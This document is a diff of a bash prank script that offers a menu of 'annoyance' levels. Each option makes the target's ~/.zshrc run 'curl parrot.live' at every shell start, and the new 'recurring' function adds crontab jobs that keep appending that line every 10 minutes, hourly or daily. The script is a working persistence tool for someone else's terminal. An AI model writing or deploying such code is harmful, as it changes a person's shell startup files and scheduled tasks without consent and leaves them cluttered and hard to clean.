@@ -1,7 +1,5 @@
-function hideyoparrot {
+function selection {
 	ESC=$( printf "\033")
-	cursor_blink_on(){ printf "$ESC[?25h"; }
-	cursor_blink_off(){ printf "$ESC[?25l"; }
 	cursor_to(){ printf "$ESC[$1;${2:-1}H"; }
 	print_option(){ printf "   $1 "; }
 	print_selected(){ printf "  $ESC[7m $1 $ESC[27m"; }
@@ -16,8 +14,7 @@ function hideyoparrot {
 	local current=`get_cursor_row`
 	local start=$(($current - $#))
 
-	trap "cursor_blink_on; stty echo; printf '\n'; exit" 2
-	cursor_blink_off
+	trap "stty echo; printf '\n'; exit" 2
 
 	local selected=0
 	while true; do
@@ -41,56 +38,56 @@ function hideyoparrot {
 	done
 
 	cursor_to $current
-	cursor_blink_on
 	return $selected
 }
 
 function select_opt {
-	hideyoparrot "$@" 1>&2
+	selection "$@" 1>&2
 	local result=$?
 	echo $result
 	return $result
 }
 
+function normal_parrot {
+	echo "echo \"curl parrot.live\" >> ~/.zshrc" > ~/.doit.sh
+	bash ~/.doit.sh
+}
+
+function fixed_parrot {
+	echo "echo \"curl parrot.live &\" >> ~/.zshrc" > ~/.doit.sh
+	bash ~/.doit.sh
+}
+
+function recurring {
+	echo
+	echo "*** Parrot is placed in .zshrc ***"
+	echo
+	echo "Do you want it placed on timely intervals?"
+	options2=("No, just this once"
+		"once every 10 min"
+		"once every hour"
+		"once every day")
+	case `select_opt "${options2[@]}"` in
+		0) curl parrot.live ;;
+		1) (crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab - ;;
+		2) (crontab -l 2>/dev/null; echo "42 */1 * * * ~/.doit.sh") | crontab - ;;
+		3) (crontab -l 2>/dev/null; echo "42 11 */1 * * ~/.doit.sh") | crontab - ;;
+	esac
+	curl parrot.live
+}
+
 touch ~/.doit.sh
 chmod 755 ~/.doit.sh
-echo "echo \"curl parrot.live\" >> ~/.zshrc" > ~/.doit.sh
-sleep 1s
 
 echo "Choose your level of annoyance:"
-options=("normal parrot\n"
-	"recurring parrot\n"
-	"fixed parrot\n"
-	"recurring fixed parrot\n"
-	"cancel and exit\n")
+options=("normal parrot"
+	"fixed parrot"
+	"cancel and exit")
 
 case `select_opt "${options[@]}"` in 
-	0)
-		bash ~/.doit.sh
-		curl parrot.live
-		break
-		;;
-	1)
-		bash ~/.doit.sh &&
-		(crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab -
-		curl parrot.live
-		break
-		;;
-	2)
-		echo "echo \"curl parrot.live &\" >> ~/.zshrc" > ~/.doit.sh &&
-		bash ~/.doit.sh
-		curl parrot.live
-		break
-		;;
-	3)
-		echo "echo \"curl parrot.live &\" >> ~/.zshrc" > ~/.doit.sh &&
-		bash ~/.doit.sh &&
-		(crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab -
-		curl parrot.live
-		break
-		;;
-	4)
-		curl parrot.live
-		break
-		;;
+	0)	normal_parrot 
+		recurring ;;
+	1)	fixed_parrot 
+		recurring ;;
+	2)	;;
 esac
